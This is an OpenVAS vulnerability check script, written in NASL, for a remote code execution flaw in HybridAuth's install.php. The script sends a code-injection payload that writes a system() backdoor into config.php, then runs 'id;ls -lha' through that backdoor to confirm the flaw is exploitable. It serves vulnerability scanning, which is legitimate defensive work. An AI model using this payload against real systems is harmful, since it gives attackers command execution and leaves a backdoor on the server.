###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hybridauth_remote_code_exec_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# HybridAuth 'install.php' Remote Code Execution Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804753");
  script_version("$Revision: 13659 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2014-08-26 10:58:06 +0530 (Tue, 26 Aug 2014)");
  script_name("HybridAuth 'install.php' Remote Code Execution Vulnerability");
  script_category(ACT_DESTRUCTIVE_ATTACK); # nb: The original version of the script was in ACT_ATTACK and exited if safe_checks was enabled.
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34273");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34390");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/127930");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Aug/10");

  script_tag(name:"summary", value:"This host is installed with HybridAuth and is prone to remote code execution
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it is
  able to execute the code remotely.");

  script_tag(name:"insight", value:"Flaw exists because the hybridauth/install.php script does not properly verify
  or sanitize user-uploaded files.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary code in the
  affected system.");

  script_tag(name:"affected", value:"HybridAuth version 2.1.2 and probably prior.");

  script_tag(name:"solution", value:"Upgrade to HybridAuth version 2.2.2 or later.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://hybridauth.sourceforge.net");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

useragent = http_get_user_agent();
host = http_host_name( port:port );

foreach dir( make_list_unique( "/", "/auth", "/hybridauth", "/social", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  rcvRes = http_get_cache( item:dir + "/install.php",  port:port );

  if( ">HybridAuth Installer<" >< rcvRes ) {

    url = dir + '/install.php';

    postData = "OPENID_ADAPTER_STATUS=system($_POST[0]))));/*";

    sndReq = string( "POST ", url, " HTTP/1.1\r\n",
                     "Host: ", host, "\r\n",
                     "User-Agent: ", useragent, "\r\n",
                     "Content-Type: application/x-www-form-urlencoded\r\n",
                     "Content-Length: ", strlen( postData ), "\r\n",
                     "\r\n", postData );

    rcvRes = http_keepalive_send_recv( port:port, data:sndReq, bodyonly:FALSE );

    if( rcvRes =~ "HTTP/1\.. 200" && "<title>HybridAuth Installer</title>" >< rcvRes ) {

      url = dir + '/config.php';

      postData = "0=id;ls -lha";

      sndReq = string( "POST ", url, " HTTP/1.1\r\n",
                       "Host: ", host, "\r\n",
                       "User-Agent: ", useragent, "\r\n",
                       "Content-Type: application/x-www-form-urlencoded\r\n",
                       "Content-Length: ", strlen( postData ), "\r\n",
                       "\r\n", postData );

      rcvRes = http_keepalive_send_recv( port:port, data:sndReq, bodyonly:FALSE );

      if( rcvRes =~ "uid=[0-9]+.*gid=[0-9]+" ) {
        report = report_vuln_url( url:url, port:port );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );